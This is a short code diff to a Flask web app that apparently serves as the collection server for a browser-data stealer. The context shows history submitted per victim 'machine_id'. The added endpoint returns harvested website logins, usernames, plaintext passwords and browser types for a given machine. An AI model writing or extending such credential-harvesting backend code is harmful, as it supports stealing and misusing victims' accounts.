@@ -133,6 +133,18 @@ def api_history(machine_id):
         } for r in rows
     ])
 
+@app.route("/api/credentials/<machine_id>")
+def api_credentials(machine_id):
+    rows = Credential.query.filter_by(machine_id=machine_id).all()
+    return jsonify([
+        {
+            "website": r.website,
+            "username": r.username,
+            "password": r.password,
+            "browser_type": r.browser_type
+        } for r in rows
+    ])
+
 @app.route("/submit/history", methods=["POST"])
 def receive_history():
     data = request.get_json()
